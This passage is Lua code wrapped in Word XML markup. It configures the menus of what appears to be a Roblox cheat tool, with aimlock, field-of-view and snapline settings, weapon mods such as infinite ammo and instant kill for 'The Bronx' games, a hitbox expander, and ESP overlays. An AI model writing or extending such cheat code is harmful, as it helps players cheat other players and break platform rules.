        <w:t xml:space="preserve">        SettingsSection:slider({name = "Smoothness", flag = "MaxDistance_Smoothness", min = 0, max = 100, default = 10, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Smoothness = state/10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        AimlockAimColumn = AimlockTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local FieldOfViewSection = AimlockAimColumn:section({name = "Field Of View", side = "right", size = 0.23, icon = GetImage("FieldOfView2.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSection:toggle({type = "toggle", name = "Enabled", flag = "AimlockAim_Usefov", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.UseFieldOfView = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSection:toggle({type = "toggle", name = "Draw Circle", flag = "AimlockAim_DrawCircle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.DrawFieldOfView = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end}):colorpicker({flag = "AimlockAim_FOVColor", default = Color3.new(1,1,1), alpha = 0.25, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.FieldOfViewColor = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.FieldOfViewTransparency = 1 - alpha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local FieldOfViewSettingsSection = AimlockAimColumn:section({name = "Field Of View Settings", side = "right", size = 0.3, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSettingsSection:slider({name = "Radius", flag = "AimlockAim_Radius", min = 0, max = 1000, default = 100, suffix = "°", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Radius = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FieldOfViewSettingsSection:slider({name = "Sides", flag = "AimlockAim_Sides", min = 3, max = 100, default = 25, suffix = "°", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Sides = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local SnaplineSection = AimlockAimColumn:section({name = "Snapline", side = "right", size = 0.275, icon = GetImage("Snapline.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SnaplineSection:toggle({type = "toggle", name = "Enabled", flag = "AimlockAim_Snapline", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.Snapline = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end}):colorpicker({flag = "AimlockAim_SnaplineColor", default = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.SnaplineColor = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        SnaplineSection:slider({name = "Snapline Thickness", flag = "AimlockAim_SnaplineThickness", min = 1, max = 5, default = 1, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.Aimlock.SnaplineThickness = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "The Bronx" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local WeaponModTab, MiscModTab = window:tab({name = "Gun Mods", tabs = {"Weapon Modifications"}, icon = GetImage("Wrench.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local WeaponModTabColumn = WeaponModTab:column({}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GeneralSection = WeaponModTabColumn:section({name = "Weapon Modifications", side = "left", size = 0.5, icon = GetImage("Pistol.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Modifications = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Ammo";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Clips";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Damage";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Fully Automatic";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Disable Jamming";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Recoil Value";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Spread Value";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Reload Speed";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Equip Speed";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Fire Rate";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Index in Modifications do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    GeneralSection:toggle({name = Index, flag = Index.."_TB3", type = "toggle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Index == "Fully Automatic" then Index = "Automatic" end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.TheBronx.Modifications[Index:gsub(" ", "")] = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection = WeaponModTabColumn:section({name = "Weapon Modifications", side = "left", size = 0.5, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Recoil Percentage", flag = "RecoilValue_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Modifications.RecoilPercentage = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Spread Percentage", flag = "SpreadValue_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Modifications.SpreadPercentage = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Fire Rate Percentage", flag = "FireRateSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Modifications.FireRateSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Reload Speed Percentage", flag = "ReloadSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Modifications.ReloadSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Equip Speed Percentage", flag = "EquipSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.TheBronx.Modifications.EquipSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "The Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local hitboxtab = window:tab({name = "Hitbox Mods", tabs = {"Hitbox"}, icon = GetImage("Wrench.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local hitboxcolumn = hitboxtab:column({}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local hitboxsection = hitboxcolumn:section({name = "Hitbox Modifications", side = "left", size = 0.4})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hitboxsection:toggle({name = 'Enabled', flag = 'HitboxesEnabled', type = 'toggle', default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end}):colorpicker({flag = 'HitboxesColor', color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Color = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Transparency = alpha</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hitboxsection:slider({name = "Hitbox Multiplier", flag = "HitBox_Multiplier", min = 1, max = 20, default = 10, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Multiplier = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hitboxsection:dropdown({name = "Hitbox Part", flag = "HitBoxPart", items = {"Head", "Torso"}, default = "Torso", multi = false, callback = function(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Part = (value == "Head") and "Head" or "HumanoidRootPart"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                hitboxsection:dropdown({name = "Hitbox Material", flag = "HitBoxMaterial", items = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "SmoothPlastic", "Wood", "Slate", "Concrete", "CorrodedMetal",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Neon", "Grass", "Fabric", "DiamondPlate", "Sandstone",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Ice", "Marble", "Granite", "Pebble", "Metal",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Glass", "Plastic", "ForceField"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }, default = "ForceField", multi = false, callback = function(value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.MiscSettings.Hitbox_Expander.Material = value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Game_Name == "South Bronx" and not Solara then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local WeaponModTab = window:tab({name = "Modifications", tabs = {"Weapon Modifications"}, icon = GetImage("Wrench.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local WeaponModTabColumn = WeaponModTab:column({}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GeneralSection = WeaponModTabColumn:section({name = "Weapon Modifications", side = "left", size = 0.5, icon = GetImage("Pistol.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Modifications = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Infinite Ammo";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Instant Kill";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Fully Automatic";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Disable Jamming";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Recoil Value";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Spread Value";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Reload Speed";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Equip Speed";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    "Modify Fire Rate";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _, Index in Modifications do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    GeneralSection:toggle({name = Index, flag = Index.."_TB3", type = "toggle", default = false, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Index == "Fully Automatic" then Index = "Automatic" end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Config.South_Bronx.Modifications[Index:gsub(" ", "")] = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection = WeaponModTabColumn:section({name = "Weapon Modifications", side = "left", size = 0.5, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Recoil Percentage", flag = "RecoilValue_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.Modifications.RecoilPercentage = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Spread Percentage", flag = "SpreadValue_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.Modifications.SpreadPercentage = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Fire Rate Percentage", flag = "FireRateSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.Modifications.FireRateSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Reload Speed Percentage", flag = "ReloadSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.Modifications.ReloadSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GeneralSection:slider({name = "Equip Speed Percentage", flag = "EquipSpeed_TB3", default = 50, min = 0, max = 100, suffix = "%", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Config.South_Bronx.Modifications.EquipSpeed = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})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/>
    <w:p>
      <w:r>
        <w:t>--window:seperator({name = ""}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local VisualsTab = window:tab({name = "ESP", tabs = {"Players"}, icon = GetImage("ESP.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local VisualsColum = VisualsTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local PlayerVisualsSection = VisualsColum:section({name = "Player Visuals", side = "left", size = 0.725})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    PlayerVisualsSection:toggle({name = "Enabled", flag = "PlayerVisuals_Enabled", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Enabled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PlayerVisualsSection:toggle({name = "Bounding Boxes", flag = "PlayerVisuals_BoundingBoxes", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Bounding.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end}):colorpicker({flag = "PlayerVisuals_BoundingBoxes_Color", color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Bounding.RGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Bounding.Transparency = alpha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PlayerVisualsSection:toggle({name = "Corner Boxes", flag = "PlayerVisuals_CornerBoxes", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Corner.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end}):colorpicker({flag = "PlayerVisuals_CornerBoxes_Color", color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Corner.RGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Corner.Transparency = alpha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local _FilledBoxes = PlayerVisualsSection:toggle({name = "Filled Boxes", flag = "PlayerVisuals_FilledBoxes", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Filled.Enabled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_FilledBoxes:colorpicker({flag = "PlayerVisuals_FilledBoxes_Color1", color = Color3.fromRGB(119, 120, 255), alpha = 0.25, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.GradientFillRGB1 = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Filled.Transparency = alpha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_FilledBoxes:colorpicker({flag = "PlayerVisuals_FilledBoxes_Color2", color = Color3.fromRGB(0, 0, 0), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.GradientFillRGB2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PlayerVisualsSection:toggle({name = "Names", flag = "PlayerVisuals_Names", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Names.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end}):colorpicker({flag = "PlayerVisuals_Names_Color", color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Names.RGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Names.Transparency = alpha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local HealthBar_Toggle = PlayerVisualsSection:toggle({name = "Health Bars", flag = "PlayerVisuals_HealthBars", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.Enabled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HealthBar_Toggle:colorpicker({flag = "PlayerVisuals_HealthBar_High_Color", color = Color3.new(0, 1, 0), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.GradientRGB2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HealthBar_Toggle:colorpicker({flag = "PlayerVisuals_HealthBar_Low_Color", color = Color3.new(1, 0, 0), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.GradientRGB1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PlayerVisualsSection:toggle({name = "Health Text", flag = "PlayerVisuals_HealthText", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.HealthText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PlayerVisualsSection:toggle({name = "Weapons", flag = "PlayerVisuals_Weapons", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Weapons.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end}):colorpicker({flag = "PlayerVisuals_Weapons_Color", color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Weapons.WeaponTextRGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Weapons.Transparency = alpha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PlayerVisualsSection:toggle({name = "Distance", flag = "PlayerVisuals_Distance", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Distances.Enabled = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end}):colorpicker({flag = "PlayerVisuals_Distance_Color", color = Color3.new(1,1,1), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Distances.RGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Distances.Transparency = alpha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local _ChamsToggle = PlayerVisualsSection:toggle({name = "Chams", flag = "PlayerVisuals_Chams", type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Chams.Enabled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_ChamsToggle:colorpicker({flag = "PlayerVisuals_Chams_Color1", color = Color3.fromRGB(119, 120, 255), alpha = 0.8, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Chams.FillRGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Distances.Fill_Transparency = alpha*100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_ChamsToggle:colorpicker({flag = "PlayerVisuals_Chams_Color2", color = Color3.new(0,0,0), alpha = 1, callback = function(state, alpha)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Chams.OutlineRGB = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Distances.Outline_Transparency = alpha*100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VisualsColum = VisualsTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local PlayerVisualsSettingsSection = VisualsColum:section({name = "Player Visual Settings", side = "left", size = 0.7, icon = GetImage("Settings.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    PlayerVisualsSettingsSection:toggle({name = "Animated Boxes", flag = "Visuals_AnimatedBox", default = false, type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
